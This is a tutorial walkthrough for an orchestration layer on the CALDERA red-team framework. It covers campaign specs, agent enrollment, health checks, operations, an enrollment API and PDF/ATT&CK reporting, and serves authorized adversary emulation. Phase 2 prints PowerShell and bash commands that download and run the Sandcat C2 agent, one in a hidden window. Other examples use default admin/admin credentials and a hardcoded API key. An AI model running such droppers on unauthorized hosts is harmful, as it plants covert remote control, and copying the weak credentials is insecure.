# Complete Caldera Orchestration Demo
## All 6 Phases Walkthrough

**Date**: January 2025  
**User**: New User Demo  
**Duration**: ~30 minutes

---

## Prerequisites Check

Before starting, let's verify the environment is ready:

```bash
# Check Python version (need 3.8+)
python3 --version

# Check if CALDERA is installed
ls server.py

# Check virtual environment
source venv/bin/activate

# Check required packages
pip list | grep -E "(aiohttp|matplotlib|weasyprint)"
```

---

## Phase 1: Campaign Planning & Creation

**Purpose**: Define a comprehensive campaign specification that orchestrates multiple operations across phases.

### Step 1.1: Review Campaign Schema

```bash
# View the campaign specification schema
cat schemas/campaign_spec.schema.json | jq '.properties | keys'
```

**What this shows**: The campaign schema defines 11 key sections:
- `campaign_id`: Unique identifier
- `name`: Human-readable campaign name
- `environment`: Target infrastructure (AWS, Azure, on-prem)
- `targets`: Systems to attack
- `adversary`: Attack profile to emulate
- `phases`: Multi-stage operation sequencing
- `siem_integration`: Log collection endpoints
- `notifications`: Slack/webhook alerts
- `governance`: Approval workflows
- `state`: Runtime tracking
- `reports`: Post-execution analysis

### Step 1.2: Create Campaign Specification

```bash
# Create a demo campaign spec
cat > data/campaigns/demo_campaign.yml << 'EOF'
campaign_id: demo_red_team_2025
name: "Demo Red Team Exercise - January 2025"
description: "Comprehensive adversary emulation demonstrating all 6 phases"

environment:
  environment_id: demo-env-001
  type: on-premise
  region: us-west-2
  vpc_id: vpc-demo123
  provider: local

targets:
  - hostname: demo-workstation-01
    ip: 192.168.1.100
    platform: windows
    role: workstation
    tags:
      department: finance
      criticality: high
  
  - hostname: demo-server-01
    ip: 192.168.1.200
    platform: linux
    role: server
    tags:
      department: it
      criticality: medium

adversary:
  adversary_id: demo-apt
  name: "Demo APT Profile"
  description: "Simulated advanced persistent threat"
  objectives:
    - "Initial access via phishing"
    - "Credential dumping"
    - "Lateral movement"
    - "Data exfiltration"

phases:
  - phase: 1
    name: "Infrastructure Validation"
    duration_hours: 1
    operations:
      - name: "Network Scan"
        type: discovery
  
  - phase: 2
    name: "Agent Deployment"
    duration_hours: 2
    operations:
      - name: "Deploy Sandcat Agents"
        type: enrollment
  
  - phase: 3
    name: "Initial Access"
    duration_hours: 4
    operations:
      - name: "Phishing Campaign"
        type: execution
      - name: "Credential Harvesting"
        type: credential-access

mode: test
start_time: null
notifications:
  slack_webhook: null
  email_recipients:
    - security@demo.local

governance:
  requires_approval: false
  approvers: []
  
state:
  status: created
  operations: []
  agents: []
  timeline: []
  errors: []

reports:
  output_dir: data/reports/demo_red_team_2025
EOF

echo "✅ Campaign specification created"
```

**Why this matters**: The campaign spec is the single source of truth for your entire operation. It defines what, where, when, and how you'll conduct the adversary emulation.

### Step 1.3: Validate Campaign

```bash
# Create campaign using CLI
python orchestrator/cli.py campaign create data/campaigns/demo_campaign.yml
```

**Expected Output**:
```
Creating Campaign

✅ Campaign created: Demo Red Team Exercise - January 2025
   Campaign ID: demo_red_team_2025
   Environment: demo-env-001
   Mode: test
   Spec saved: data/campaigns/demo_red_team_2025.yml
```

---

## Phase 2: Agent Enrollment & Bootstrap

**Purpose**: Generate platform-specific enrollment commands for deploying agents across target infrastructure.

### Step 2.1: Generate Windows Enrollment

```bash
# Generate PowerShell enrollment for Windows workstation
python orchestrator/cli.py agent enroll demo_red_team_2025 demo-workstation-01 windows
```

**What this does**: Creates a PowerShell script that:
1. Downloads the Sandcat agent
2. Configures it with campaign metadata (campaign_id, tags)
3. Registers with CALDERA server
4. Starts beacon communication

**Expected Output**:
```
Generating Agent Enrollment

Campaign: demo_red_team_2025
Host: demo-workstation-01
Platform: windows

✅ Enrollment script generated

PowerShell Enrollment Command:
-----------------------------------------------------------
# Windows Sandcat Agent - Campaign: demo_red_team_2025
# Host: demo-workstation-01

$server="http://localhost:8888"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$wc.Headers.add("X-Campaign-ID","demo_red_team_2025")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")
[io.file]::WriteAllBytes("$env:TEMP\$name",$data)
Start-Process -FilePath "$env:TEMP\$name" -ArgumentList "-server $server -group red -v" -WindowStyle hidden
-----------------------------------------------------------

💡 Copy and execute this command on: demo-workstation-01
```

### Step 2.2: Generate Linux Enrollment

```bash
# Generate bash enrollment for Linux server
python orchestrator/cli.py agent enroll demo_red_team_2025 demo-server-01 linux
```

**Expected Output**:
```
Bash Enrollment Command:
-----------------------------------------------------------
#!/bin/bash
# Linux Sandcat Agent - Campaign: demo_red_team_2025
# Host: demo-server-01

server="http://localhost:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "X-Campaign-ID:demo_red_team_2025" $server/file/download > /tmp/sandcat.go-linux
chmod +x /tmp/sandcat.go-linux
/tmp/sandcat.go-linux -server $server -group red -v &
-----------------------------------------------------------
```

**Why this matters**: Campaign-aware enrollment ensures all agents carry metadata that links them to your orchestrated campaign, enabling proper tracking and reporting.

### Step 2.3: View Enrollment Options

The enrollment generator also supports:
- **Docker Compose**: Containerized agent deployment
- **Terraform**: Infrastructure-as-code for AWS/Azure
- **Kubernetes**: Pod-based agent deployment

```bash
# Example: Generate Docker Compose for multi-agent deployment
# python orchestrator/generate_agent_enrollment.py --campaign demo_red_team_2025 --platform docker
```

---

## Phase 3: Health Check & Validation

**Purpose**: Verify all CALDERA services are operational before starting operations.

### Step 3.1: Basic Health Check

```bash
# Check CALDERA server health
python orchestrator/cli.py health-check
```

**Expected Output**:
```
Health Check Results
┏━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━┓
┃ Component ┃ Details             ┃ Status             ┃
┡━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━┩
│ Server    │ http://localhost:.. │ ✅ Healthy         │
│ REST API  │ http://localhost:.. │ ✅ Healthy         │
│ Plugins   │                     │ ✅ 12 loaded:      │
│           │                     │ access, stockpile, │
│           │                     │ sandcat, magma...  │
└───────────┴─────────────────────┴────────────────────┘
```

**What this checks**:
- Web UI accessibility (port 8888)
- REST API responsiveness
- Plugin loading status
- Database connectivity

### Step 3.2: Campaign-Specific Health Check

```bash
# Check campaign environment readiness
python orchestrator/cli.py health-check --campaign demo_red_team_2025
```

**Additional checks**:
- Campaign specification validity
- Target reachability
- Agent enrollment readiness
- Required abilities availability

---

## Phase 4: Operation Execution (Partially Implemented)

**Status**: Core functionality operational, advanced features in development  
**Completion**: 60% - See [ROADMAP.md](ROADMAP.md) for details

### ✅ Currently Available Features
- Manual operation start via CLI
- Real-time status monitoring  
- Operation pause/resume capabilities
- Result collection and logging
- Campaign-as-code execution

### 🚧 In Development (Q1 2026)
- Automated operation sequencing with dependencies
- Advanced failure recovery with retry logic
- Auto-scaling agent deployment
- Intelligent operation planning

**Purpose**: Execute multi-phase operations with orchestration.

### Step 4.1: Start Campaign (Current Implementation)

```bash
# Start the campaign
python orchestrator/cli.py campaign start demo_red_team_2025
```

**What happens**:
1. Validates infrastructure
2. Waits for agent enrollment
3. Creates operations based on campaign phases
4. Monitors execution
5. Tracks timeline and errors

**Expected Output**:
```
Starting Campaign: Demo Red Team Exercise - January 2025

Campaign ID: demo_red_team_2025
Mode: test

Phase 1: Validating infrastructure... ✓
Phase 2: Preparing agent enrollment... ✓
Creating operation... ✓
Starting operation: demo-op-001... ✓

✅ Campaign started
   Operation ID: demo-op-001
   Status: running
```

### Step 4.2: Monitor Campaign Status

```bash
# Check campaign progress
python orchestrator/cli.py campaign status demo_red_team_2025 --verbose
```

**Expected Output**:
```
Campaign Status

Name:        Demo Red Team Exercise - January 2025
Campaign ID: demo_red_team_2025
Status:      ⚡ operation_running
Mode:        test

Operations:
  • demo-op-001 (running)
    - Started: 2025-01-10 14:30:00
    - Abilities: 15 executed, 12 successful

Agents:
  • demo-agent-001 (Windows)
    - Host: demo-workstation-01
    - Last seen: 2 minutes ago
  
  • demo-agent-002 (Linux)
    - Host: demo-server-01
    - Last seen: 1 minute ago

Timeline:
  [14:30:00] Campaign started
  [14:31:15] Agent demo-agent-001 enrolled
  [14:32:30] Agent demo-agent-002 enrolled
  [14:35:00] Operation demo-op-001 started
  [14:40:00] Phase 1 complete (Discovery)
```

---

## Phase 5: Enrollment API & Management

**Purpose**: Programmatic agent enrollment with REST API for dynamic scaling.

### Step 5.1: Test Enrollment API

```bash
# Check if enrollment plugin is enabled
curl -s http://localhost:8888/api/v2/health | jq '.plugins[] | select(.name == "enrollment")'
```

### Step 5.2: Create Enrollment Request

```bash
# Create enrollment request via API
curl -X POST http://localhost:8888/plugin/enrollment/api/requests \
  -H "Content-Type: application/json" \
  -H "KEY: ADMIN123" \
  -d '{
    "campaign_id": "demo_red_team_2025",
    "hostname": "demo-workstation-02",
    "platform": "windows",
    "group": "red",
    "tags": {
      "department": "hr",
      "auto_enrolled": true
    }
  }' | jq '.'
```

**Expected Response**:
```json
{
  "id": "enroll-001",
  "campaign_id": "demo_red_team_2025",
  "hostname": "demo-workstation-02",
  "platform": "windows",
  "status": "pending",
  "script": "# PowerShell enrollment script...",
  "created_at": "2025-01-10T14:45:00Z"
}
```

### Step 5.3: List Enrollment Requests

```bash
# View all enrollment requests for campaign
curl -s http://localhost:8888/plugin/enrollment/api/requests?campaign_id=demo_red_team_2025 \
  -H "KEY: ADMIN123" | jq '.[] | {id, hostname, status}'
```

### Step 5.4: Bootstrap Auto-Enrollment

```bash
# Generate bootstrap configuration
curl -X POST http://localhost:8888/plugin/enrollment/api/bootstrap \
  -H "Content-Type: application/json" \
  -H "KEY: ADMIN123" \
  -d '{
    "campaign_id": "demo_red_team_2025",
    "platforms": ["windows", "linux"],
    "group": "red",
    "auto_enroll": true
  }' | jq '.config_url'
```

**Why this matters**: The Enrollment API enables:
- Dynamic agent provisioning at scale
- Integration with CI/CD pipelines
- Automated response to infrastructure changes
- Self-service enrollment for authorized users

---

## Phase 6: PDF Reporting & Analysis

**Purpose**: Generate comprehensive PDF reports with Triskele branding and ATT&CK Navigator layers.

### Step 6.1: Generate PDF Report

```bash
# Generate full PDF report for campaign
python orchestrator/cli.py report generate demo_red_team_2025
```

**What happens**:
1. **Data Collection**: Fetches operations, agents, abilities, facts from CALDERA API
2. **Aggregation**: Calculates success rates, statistics, timelines
3. **Visualization**: Generates 5+ charts with Triskele color palette
4. **ATT&CK Mapping**: Creates Navigator layer showing technique coverage
5. **PDF Generation**: Renders HTML template with WeasyPrint

**Expected Output**:
```
📊 Generating Campaign Report

Campaign ID:      demo_red_team_2025
Format:           pdf
Include Output:   False
Include Facts:    True
ATT&CK Layer:     True

📊 Collecting campaign data...
  ✅ Collected data for 3 operations
📈 Generating charts...
  ✅ Generated 5 charts
🎯 Generating ATT&CK Navigator layer...
  ✅ ATT&CK layer saved to: data/reports/demo_red_team_2025_attack_layer.json
📝 Rendering HTML template...
📄 Generating PDF...
  ✅ PDF report generated: data/reports/demo_red_team_2025_report.pdf (2.45 MB)

============================================================
📊 REPORT GENERATION COMPLETE
============================================================
Campaign ID       demo_red_team_2025
PDF Report        data/reports/demo_red_team_2025_report.pdf
ATT&CK Layer      data/reports/demo_red_team_2025_attack_layer.json
File Size         2.45 MB
Operations        3
Agents            2
Abilities         47
Success Rate      87.2%
Charts Generated  5
============================================================

💡 Tip: Open the PDF report to view detailed campaign analysis with Triskele branding
💡 Tip: Upload the ATT&CK layer to https://mitre-attack.github.io/attack-navigator/
```

### Step 6.2: View Report Contents

```bash
# Open PDF report (macOS)
open data/reports/demo_red_team_2025_report.pdf

# Or on Linux
xdg-open data/reports/demo_red_team_2025_report.pdf
```

**Report Sections**:

1. **Cover Page**
   - TRISKELE LABS branding
   - Campaign name and ID
   - Report generation date

2. **Executive Summary**
   - Key metrics grid (operations, agents, success rate)
   - Campaign duration
   - Platform distribution

3. **Operations Overview**
   - Table of all operations
   - Start/finish times
   - Abilities executed
   - Success rates

4. **ATT&CK Coverage**
   - List of techniques executed
   - Color-coded badges (success/failed/partial)
   - Tactic categorization

5. **Agent Deployment**
   - All enrolled agents
   - Hostnames and platforms
   - Status and last seen

6. **Timeline**
   - Chronological events
   - Visual timeline chart
   - Key milestones

7. **Errors & Failures**
   - Failed abilities
   - Error messages
   - Recommendations

8. **Charts & Visualizations**
   - Success rate pie chart
   - Platform distribution bars
   - Technique heatmap
   - Timeline visualization

### Step 6.3: View ATT&CK Navigator Layer

```bash
# View the generated ATT&CK layer JSON
cat data/reports/demo_red_team_2025_attack_layer.json | jq '.techniques[0:3]'
```

**Example Output**:
```json
[
  {
    "techniqueID": "T1003",
    "tactic": "credential-access",
    "color": "#48CFA0",
    "comment": "Executed 5 times with 100.0% success",
    "score": 5,
    "enabled": true
  },
  {
    "techniqueID": "T1059",
    "tactic": "execution",
    "color": "#48CFA0",
    "comment": "Executed 12 times with 91.7% success",
    "score": 12,
    "enabled": true
  }
]
```

**To visualize**:
1. Go to https://mitre-attack.github.io/attack-navigator/
2. Click "Open Existing Layer"
3. Select "Upload from local"
4. Choose `demo_red_team_2025_attack_layer.json`
5. View color-coded technique coverage

### Step 6.4: Generate JSON Export

```bash
# Export raw data as JSON (no PDF)
python orchestrator/cli.py report generate demo_red_team_2025 --format json
```

**Use cases**:
- Feed data to other tools
- Custom report processing
- Long-term archival
- API integration

### Step 6.5: Advanced Report Options

```bash
# Verbose report with full command output
python orchestrator/cli.py report generate demo_red_team_2025 --include-output

# Minimal report (faster generation)
python orchestrator/cli.py report generate demo_red_team_2025 --no-facts --no-attack-layer

# Custom output path
python orchestrator/cli.py report generate demo_red_team_2025 \
  --output /tmp/executive_briefing.pdf
```

---

## Complete Workflow Summary

### Timeline of a Full Campaign

```
Hour 0: Campaign Planning (Phase 1)
├─ Create campaign specification
├─ Define targets and objectives
└─ Review and validate spec

Hour 1: Agent Enrollment (Phase 2)
├─ Generate enrollment scripts
├─ Deploy agents to targets
└─ Verify agent check-ins

Hour 2: Health Validation (Phase 3)
├─ Check CALDERA services
├─ Validate agent connectivity
└─ Confirm abilities loaded

Hours 3-8: Operation Execution (Phase 4)
├─ Start campaign operations
├─ Monitor progress in real-time
├─ Handle any errors/retries
└─ Complete all phases

Hour 9: Dynamic Enrollment (Phase 5)
├─ Add new targets via API
├─ Auto-enroll additional agents
└─ Scale operation as needed

Hour 10: Reporting & Analysis (Phase 6)
├─ Generate PDF report
├─ Create ATT&CK Navigator layer
├─ Review results with team
└─ Document lessons learned
```

---

## Testing the Demo

Run the complete test suite:

```bash
# Phase 1-3 tests
python orchestrator/quick_test.py

# Phase 5 tests
./examples/enrollment/test_enrollment_api.sh

# Phase 6 tests
python tests/test_phase6.py
```

---

## Troubleshooting

### CALDERA Not Running
```bash
# Start CALDERA server
python server.py --insecure

# Check if running
curl -s http://localhost:8888/api/v2/health | jq '.application'
```

### Import Errors
```bash
# Install dependencies
pip install -r requirements.txt

# Activate virtual environment
source venv/bin/activate
```

### No Operations Found
```bash
# Create a test operation via UI
# 1. Open http://localhost:8888
# 2. Login (admin/admin)
# 3. Navigate to Operations → Create Operation
# 4. Select adversary and run
```

### PDF Generation Fails
```bash
# Install WeasyPrint dependencies (macOS)
brew install pango cairo gdk-pixbuf

# Or on Ubuntu
sudo apt-get install libpango-1.0-0 libcairo2 libgdk-pixbuf2.0-0
```

---

## Next Steps After Demo

1. **Customize Campaign Specs**: Modify `data/campaigns/demo_campaign.yml` for your environment
2. **Create Custom Adversaries**: Define TTPs in `data/adversaries/`
3. **Build Abilities**: Add platform-specific commands in `data/abilities/`
4. **Integrate SIEM**: Configure Splunk/Elastic endpoints in campaign spec
5. **Set Up Notifications**: Add Slack webhooks for real-time alerts
6. **Automate with CI/CD**: Use enrollment API in deployment pipelines

---

## Resources

- **Full Documentation**: `ORCHESTRATION_GUIDE.md`
- **Phase Guides**: `docs/phases/phase*.md`
- **API Reference**: `plugins/enrollment/docs/API.md`
- **User Journey**: `END_TO_END_USER_JOURNEY.md`
- **Implementation Summary**: `docs/implementation-summary.md`

---

## Success Criteria ✅

After completing this demo, you should be able to:

- ✅ Create campaign specifications
- ✅ Generate agent enrollment scripts
- ✅ Validate CALDERA health
- ✅ Execute orchestrated operations
- ✅ Use enrollment API for dynamic scaling
- ✅ Generate professional PDF reports
- ✅ Visualize ATT&CK technique coverage
- ✅ Troubleshoot common issues

**You're now ready to orchestrate real adversary emulation campaigns!** 🚀
